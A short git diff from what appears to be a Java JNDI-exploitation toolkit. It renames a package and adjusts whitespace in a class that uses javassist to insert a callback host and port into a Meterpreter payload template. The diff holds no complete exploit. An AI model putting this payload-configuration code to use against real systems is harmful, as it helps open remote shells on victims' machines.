@@ -1,4 +1,4 @@
-package com.nu1r.jndi.utils;
+package com.nu1r.jndi.gadgets.utils;
 
 import com.nu1r.jndi.template.Meterpreter;
 import javassist.*;
@@ -39,7 +39,7 @@ public class ClassByteChange {
         //获取到对应的方法
         CtMethod cMethodHost = cClass.getDeclaredMethod("initLhost");
 
-        cMethodHost.setBody("{        this.host = \""+Config.rhost+"\";\n" +
+        cMethodHost.setBody("{        this.host = \""+ Config.rhost+"\";\n" +
                 "        this.port = \""+Config.rport+"\";}");
 
         //替换原有的文件
